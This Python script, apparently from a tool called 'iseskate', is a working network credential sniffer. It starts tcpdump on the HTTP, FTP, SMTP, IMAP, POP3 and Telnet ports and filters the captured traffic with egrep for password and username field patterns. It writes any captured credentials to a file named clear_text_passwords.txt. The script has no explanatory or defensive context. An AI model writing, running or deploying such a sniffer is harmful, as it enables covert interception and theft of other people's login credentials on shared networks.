import subprocess
import os

try:
    os.makedirs("/usr/share/iseskate/PCAP/")
except OSError:
    pass

pcapf = "/usr/share/iseskate/PCAP/"

# Conducting a continuous packet capture
def data_capture():
    pass_cap = "tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i " \
               "-B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= " \
               "|password=|pass:|user:|username:|password:|login:|pass |user ' > " + pcapf + "clear_text_passwords.txt"

    subprocess.Popen(pass_cap, shell=True)


if __name__ == '__main__':
    data_capture()
